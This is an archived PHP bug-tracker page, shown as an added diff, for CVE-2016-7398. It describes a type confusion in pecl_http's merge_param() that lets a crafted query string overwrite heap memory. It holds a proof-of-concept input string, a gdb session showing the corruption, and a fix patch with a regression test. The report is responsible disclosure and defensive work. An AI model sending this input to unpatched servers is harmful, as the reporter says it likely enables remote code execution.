@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='pecl_http Bug #73055 - RDF' href='rss/bug.php?id=73055'>
+        <link rel='alternate' type='application/rss+xml' title='pecl_http Bug #73055 - RSS 2.0' href='rss/bug.php?id=73055&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #73055 :: Type confusion vulnerability in merge_param()</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=73055">Sec Bug</a>&nbsp;#73055</th>
+            <td id="summary" colspan="5">Type confusion vulnerability in merge_param()</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-09-09 11:13 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2017-02-13 01:21 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=mike">mike</a> (<a href="https://people.php.net/mike">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=pecl_http">pecl_http</a> (<a href="https://pecl.php.net/package/pecl_http" target="_blank">PECL</a>)</td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>master-Git-2016-09-09 (Git)</td>
+            <th class="details">OS:</th>
+            <td></td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398" target="_blank">2016-7398</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=73055&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=73055&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=73055&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1473419595">&nbsp;</a><strong>[2016-09-09 11:13 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<pre class='note'>Description:
+------------
+The url parsing functions of the PECL HTTP extension allow overflowing
+a heap-based buffer with data originating from an arbitrary HTTP request.
+Affected is the `merge_param()` function in php_http_params.c that is called
+from `php_http_querystring_parse()`:  
+
+Code fragment from `merge_param()` in php_http_params.c:491:
+
+    static void merge_param(HashTable *params, zval *zdata, ...)
+    {
+    [...]
+        while (Z_TYPE_P(zdata_ptr) == IS_ARRAY &amp;&amp; (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {
+            if (Z_TYPE_P(test_ptr) == IS_ARRAY) {
+                zval *tmp_ptr = ptr;
+    
+    [...]           
+                } else {
+                    if ((ptr = zend_hash_index_find(Z_ARRVAL_P(ptr), hkey.h))) {
+                        zdata_ptr = test_ptr;
+                    } else if (hkey.h) {
+                        ptr = tmp_ptr;
+                        Z_TRY_ADDREF_P(test_ptr);
+    [511]               ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);
+    [...]
+
+In line 511 `zend_hash_index_update()` is called with ptr used as an array
+(`Z_ARRVAL_P(ptr)`) without actually checking its type. Thus it was possible
+to call `zend_hash_index_update()` on a zend_string instead which obviously
+leads to memory corruption issues.
+
+The sample request provided in this report uses this type confusion
+vulnerability to trigger an arbitrary heap overwrite. The actual overwrite
+occurs in `_zend_hash_index_add_or_update_i()`: 
+
+    static zend_always_inline zval *_zend_hash_index_add_or_update_i(HashTable *ht, zend_ulong h, zval *pData, uint32_t flag ZEND_FILE_LINE_DC)
+    {
+    [...]
+    add_to_hash:
+    [...]
+        p = ht-&gt;arData + idx;
+        p-&gt;h = h;						// &lt;- heap overflow
+        p-&gt;key = NULL;					// &lt;- heap overflow
+    [...]
+    }
+
+Because of the invalid pointer provided as HashTable `ht-&gt;arData` points
+to an unexpected memory location on the heap and not to the list of Buckets
+of an ordinary HashTable. So the two following assignments allow to write
+arbitrary values (`hkey.h` and NULL) on the heap.
+As it turned out `hkey.h` can be controlled with request data received from
+the network.  
+The attached proof of concept demonstrates that this flaw very likely allows
+for remote code execution.
+
+This vulnerability was found using `afl-fuzz`/`afl-utils`.
+
+# PoC
+
+See the attached patch for the sample request in bugXXXXX.bin.
+
+    $ cat http_querystring.php
+    /*
+     * http_querystring.php
+     */
+    &lt;?php
+    	$qs = new http\QueryString(file_get_contents(&quot;bugXXXXX.bin&quot;));
+    ?&gt;
+
+    $ ./configure --enable-raphf --enable-propro --with-http &amp;&amp; make
+
+    $ gdb ./sapi/cli/php
+    gdb&gt; b php_http_params.c:511
+    gdb&gt; r http_querystring.php
+    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,
+    params=&lt;optimized out&gt;) at php_http_params.c:511
+    511				ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);
+    gdb&gt; p ptr.u1.type_info
+    $1 = 6                      // &lt;-- IS_STRING, incorrect type!
+    gdb&gt; b zend_hash.c:811
+    gdb&gt; c
+    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at
+    zend_hash.c:811
+    811		p-&gt;h = h;						// &lt;- heap overflow
+    gdb&gt; p &amp;p-&gt;h
+    $2 = (zend_ulong *) 0x1091f40
+    gdb&gt; x/8gx 0x1091f20                    // heap before overflow
+    0x1091f20:	0x000000006c72755c	0x0000000000000021
+    0x1091f30:	0x00007ffff5addb48	0x0000000001092960
+    0x1091f40:	0x0000000000000020	0x0000000000000031 &lt;-- heap meta-data (prev-size, size)
+    0x1091f50:	0x0000070600000001	0x800000017c9c614a
+    gdb&gt; ni 2
+    gdb&gt; x/8gx 0x1091f20                    // heap after overflow
+    0x1091f20:	0x000000006c72755c	0x0000000000000021
+    0x1091f30:	0x00007ffff5addb48	0x0000000001092960
+    0x1091f40:	0x0000000000004142	0x0000000000000000 &lt;-- heap meta-data overwritten*
+    0x1091f50:	0x0000070600000001	0x800000017c9c614a
+    /*
+     * (*) 0x4142 originates from bugXXXXX.bin offset 0x59
+     * The numeric string '16706' is converted into the integer
+     * it is representing 0x4142 (see sanitize_dimension()).
+     */
+    gdb&gt; bt                                 // for the record
+    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815
+    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838
+    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=&lt;optimized out&gt;) at php_http_params.c:511
+    #3  push_param (params=&lt;optimized out&gt;, state=&lt;optimized out&gt;, opts=&lt;optimized out&gt;) at php_http_params.c:607
+    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755
+    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 '[' &lt;repeats 27 times&gt;, &quot;]]]]&quot;, '[' &lt;repeats 38 times&gt;, &quot;&amp;%C0[]E[=&amp;2[&amp;%C0[]E[16706[*[&quot;, len=&lt;optimized out&gt;) at php_http_querystring.c:224
+    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268
+    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49
+    #8  zim_HttpQueryString___construct (execute_data=&lt;optimized out&gt;, return_value=&lt;optimized out&gt;) at php_http_querystring.c:365
+    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970
+    [...]
+    gdb&gt; dis 1 2
+    gdb&gt; c
+    Fatal error: Uncaught http\Exception\BadQueryStringException: http\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5
+    Stack trace:
+    #0 http_querystr.php(5): http\QueryString-&gt;__construct('[[[[[[[[[[[[[[[...')
+    #1 {main}
+    
+    Next 
+      thrown in http_querystr.php on line 5
+    *** Error in `sapi/cli/php': free(): invalid pointer: 0x0000000001091f50 ***
+    Program received signal SIGABRT, Aborted.
+    0x00007ffff577804f in raise () from /usr/lib/libc.so.6
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=73055'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=73055'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1473419902">&nbsp;</a><strong>[2016-09-09 11:18 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<pre class='note'>Hm, could not add patch file to original report. Might be a bug in the tracker. So here it goes...
+
+# Patch
+
+After careful review by the project maintainers the following patch may be used
+to fix the reported issue. 
+
+From 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001
+From: rc0r &lt;hlt99@blinkenshell.org&gt;
+Date: Fri, 9 Sep 2016 11:31:57 +0200
+Subject: [PATCH] Type confusion vulnerability in merge_param() (#XXXXX) fixed
+
+---
+ src/php_http_params.c   |  2 +-
+ tests/bugXXXXX.phpt     | 25 +++++++++++++++++++++++++
+ tests/data/bugXXXXX.bin |  1 +
+ 3 files changed, 27 insertions(+), 1 deletion(-)
+ create mode 100644 tests/bugXXXXX.phpt
+ create mode 100644 tests/data/bugXXXXX.bin
+
+diff --git a/src/php_http_params.c b/src/php_http_params.c
+index 8988f43..0846f47 100644
+--- a/src/php_http_params.c
++++ b/src/php_http_params.c
+@@ -489,7 +489,7 @@ static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv
+            zval *test_ptr;
+ 
+            while (Z_TYPE_P(zdata_ptr) == IS_ARRAY &amp;&amp; (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {
+-				if (Z_TYPE_P(test_ptr) == IS_ARRAY) {
++				if ((Z_TYPE_P(test_ptr) == IS_ARRAY) &amp;&amp; (Z_TYPE_P(ptr) == IS_ARRAY)) {
+                    zval *tmp_ptr = ptr;
+ 
+                    /* now find key in ptr */
+diff --git a/tests/bugXXXXX.phpt b/tests/bugXXXXX.phpt
+new file mode 100644
+index 0000000..260e823
+--- /dev/null
++++ b/tests/bugXXXXX.phpt
+@@ -0,0 +1,25 @@
++--TEST--
++Type confusion vulnerability in merge_param()
++--SKIPIF--
++&lt;?php
++include &quot;skipif.inc&quot;;
++?&gt;
++--FILE--
++&lt;?php
++
++echo &quot;Test\n&quot;;
++try {
++	echo new http\QueryString(file_get_contents(__DIR__.&quot;/data/bugXXXXX.bin&quot;)); // &lt;- put provided sample into correct location
++} catch (Exception $e) {
++	echo $e;
++}
++?&gt;
++
++===DONE===
++--EXPECTF--
++Test
++%r(exception ')?%rhttp\Exception\BadQueryStringException%r(' with message '|: )%rhttp\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbugXXXXX.php:5
++Stack trace:
++#0 %sbugXXXXX.php(5): http\QueryString-&gt;__construct('[[[[[[[[[[[[[[[...')
++#1 {main}
++===DONE===
+\ No newline at end of file
+diff --git a/tests/data/bugXXXXX.bin b/tests/data/bugXXXXX.bin
+new file mode 100644
+index 0000000..ad2dd9f
+--- /dev/null
++++ b/tests/data/bugXXXXX.bin
+@@ -0,0 +1 @@
++[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[&amp;%C0[]E[=&amp;2[&amp;%C0[]E[16706[*[
+\ No newline at end of file
+-- 
+2.9.3
+</pre>
+</div><div class='comment type_log' ><a name="1473441784">&nbsp;</a><strong>[2016-09-09 17:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Security</span>
+<span class="added">+Type: Bug</span>
+</div></div></div><div class='comment type_log' ><a name="1473445833">&nbsp;</a><strong>[2016-09-09 18:30 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Package:     HTTP related</span>
+<span class="added">+Package:     pecl_http</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: mike</span>
+</div></div></div><div class='comment type_comment' ><a name="1473445833">&nbsp;</a><strong>[2016-09-09 18:30 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Assigned to maintainer.
+</pre>
+</div><div class='comment type_log' ><a name="1473450472">&nbsp;</a><strong>[2016-09-09 19:47 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type:           Bug</span>
+<span class="added">+Type:           Security</span>
+<span class="removed">-Private report: No</span>
+<span class="added">+Private report: Yes</span>
+</div></div></div><div class='comment type_comment' ><a name="1473450472">&nbsp;</a><strong>[2016-09-09 19:47 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<pre class='note'>What's the reason for marking this as a non-security issue?
+</pre>
+</div><div class='comment type_log' ><a name="1473661949">&nbsp;</a><strong>[2016-09-12 06:32 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_comment' ><a name="1473661949">&nbsp;</a><strong>[2016-09-12 06:32 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<pre class='note'>Fix comitted in 17137d4ab1ce81a2cee0fae842340a344ef3da83
+<a href="https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83" rel="nofollow">https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83</a>
+
+Thank you!
+</pre>
+</div><div class='comment type_log' ><a name="1475596266">&nbsp;</a><strong>[2016-10-04 15:51 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Security</span>
+<span class="added">+Type: Bug</span>
+</div></div></div><div class='comment type_log' ><a name="1475648800">&nbsp;</a><strong>[2016-10-05 06:26 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-7398</span>
+</div></div></div><div class='comment type_log' ><a name="1475648945">&nbsp;</a><strong>[2016-10-05 06:29 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Bug</span>
+<span class="added">+Type: Security</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
